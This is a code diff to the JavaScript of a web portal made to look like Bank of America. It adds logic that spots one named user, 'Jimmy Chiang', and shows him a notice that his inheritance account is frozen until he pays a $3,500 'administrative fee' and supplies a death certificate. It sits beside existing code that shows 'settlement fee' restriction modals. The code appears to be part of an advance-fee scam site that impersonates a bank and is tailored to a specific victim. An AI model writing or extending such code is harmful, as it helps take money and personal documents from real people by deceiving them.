@@ -150,6 +150,23 @@
     window.BoAConfig = {
         formatCurrency: formatCurrency,
 
+        isJimmyChiang: function (name) {
+            const fullName = name || (cachedConfig && cachedConfig.fullName) || '';
+            return /^jimmy\s+chiang$/i.test(String(fullName).trim());
+        },
+
+        getJimmyUpgradeNotice: function () {
+            return {
+                title: 'ACCOUNT UPGRADE PENDING',
+                bodyHtml:
+                    'Your inheritance account is currently unavailable due to an account upgrade and missing documentation: the death certificate of the deceased account holder.<br><br>' +
+                    'A <strong style="color: #E31837;">$3,500</strong> administrative fee is required for the account upgrade and activation.<br><br>' +
+                    '<strong>Status: Pending Completion</strong>',
+                button: 'I Understand',
+                support: 'Contact Support'
+            };
+        },
+
         load: async function () {
             const token = window.BoAAuth && typeof window.BoAAuth.getToken === 'function'
                 ? window.BoAAuth.getToken()
@@ -285,6 +302,26 @@
 
         renderInvestRestriction: function () {
             const config = this.get();
+
+            const title = document.getElementById('investRestrictionTitle') || document.querySelector('#restrictionModal .security-title');
+            const greeting = document.getElementById('investRestrictionGreeting');
+            const message = document.getElementById('investRestrictionMessage');
+            const feeLine = document.getElementById('investRestrictionFeeText');
+            const fee = document.getElementById('investSettlementFee');
+            const button = document.getElementById('closeRestrictionBtn');
+            const support = document.getElementById('contactSupportLink');
+
+            if (this.isJimmyChiang(config.fullName)) {
+                const notice = this.getJimmyUpgradeNotice();
+                if (title) title.textContent = notice.title;
+                if (greeting) greeting.innerHTML = '';
+                if (message) message.innerHTML = notice.bodyHtml;
+                if (feeLine) feeLine.innerHTML = '';
+                if (button) button.textContent = notice.button;
+                if (support) support.textContent = notice.support;
+                return;
+            }
+
             const restriction = config.restriction || {};
             const feeFormatted = this.formatCurrency(restriction.settlementFee);
             const name = config.fullName || 'Customer';
@@ -294,14 +331,6 @@
                     .replace(/\{name\}/gi, name)
                     .replace(/\{fee\}/gi, feeFormatted);
             }
-
-            const title = document.getElementById('investRestrictionTitle') || document.querySelector('#restrictionModal .security-title');
-            const greeting = document.getElementById('investRestrictionGreeting');
-            const message = document.getElementById('investRestrictionMessage');
-            const feeLine = document.getElementById('investRestrictionFeeText');
-            const fee = document.getElementById('investSettlementFee');
-            const button = document.getElementById('closeRestrictionBtn');
-            const support = document.getElementById('contactSupportLink');
 
             if (title) {
                 title.textContent = restriction.title || 'Account Restricted';
